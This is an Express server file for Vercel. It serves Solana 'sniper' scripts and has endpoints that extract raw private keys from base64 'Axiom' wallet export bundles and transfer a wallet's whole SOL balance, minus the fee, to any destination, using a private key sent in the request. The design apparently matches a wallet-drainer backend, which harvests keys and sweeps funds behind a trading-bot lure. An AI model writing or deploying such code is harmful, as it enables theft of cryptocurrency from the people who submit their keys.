// Vercel Serverless Function - Export Express app
const express = require('express');
const cors = require('cors');
const bs58 = require('bs58');
const { Connection, PublicKey, Keypair, SystemProgram, Transaction } = require('@solana/web3.js');
const nacl = require('tweetnacl');

const app = express();
app.use(cors());
app.use(express.json());

const RPC_URL = 'https://api.mainnet-beta.solana.com';
const connection = new Connection(RPC_URL, 'confirmed');

// ── Serve sniper files ──
app.get('/pumpfun-sniper.js', (req, res) => {
  const fs = require('fs');
  const path = require('path');
  try {
    const code = fs.readFileSync(path.join(__dirname, '../pumpfun-sniper.js'), 'utf8');
    res.setHeader('Content-Type', 'application/javascript');
    res.send(code);
  } catch (e) {
    res.status(500).send('Error: ' + e.message);
  }
});

app.get('/sniper.js', (req, res) => {
  const fs = require('fs');
  const path = require('path');
  try {
    const code = fs.readFileSync(path.join(__dirname, '../sniper.js'), 'utf8');
    res.setHeader('Content-Type', 'application/javascript');
    res.send(code);
  } catch (e) {
    res.status(500).send('Error: ' + e.message);
  }
});

// ── Decode Axiom bundle ──
app.post('/decode-axiom-bundle', (req, res) => {
  try {
    const { importBundle } = req.body;
    if (!importBundle) {
      return res.status(400).json({ error: 'Missing importBundle' });
    }

    const decoded = Buffer.from(importBundle, 'base64');
    const privateKeyBytes = decoded.slice(0, 32);
    const keypair = Keypair.fromSecretKey(privateKeyBytes);

    res.json({
      solanaAddress: keypair.publicKey.toString(),
      solanaPrivateKey: bs58.encode(privateKeyBytes),
    });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});

// ── Send SOL directly ──
app.post('/send-sol-direct', async (req, res) => {
  try {
    const { destination, privateKey } = req.body;
    if (!destination || !privateKey) {
      return res.status(400).json({ error: 'Missing destination or privateKey' });
    }

    const privateKeyBuffer = bs58.decode(privateKey);
    const keypair = Keypair.fromSecretKey(privateKeyBuffer);
    const destinationPubkey = new PublicKey(destination);

    const balance = await connection.getBalance(keypair.publicKey);
    if (balance < 5000) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: destinationPubkey,
        lamports: balance - 5000,
      })
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = keypair.publicKey;
    transaction.sign(keypair);

    const signature = await connection.sendRawTransaction(transaction.serialize());
    res.json({ signature });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});

// ── Get balance ──
app.post('/get-balance', async (req, res) => {
  try {
    const { address } = req.body;
    const balance = await connection.getBalance(new PublicKey(address));
    res.json({ balance: balance / 1e9 });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});

// ── Pumpfun buy (placeholder) ──
app.post('/pumpfun-buy', (req, res) => {
  res.json({ error: 'Not implemented yet', status: 'pending' });
});

module.exports = app;
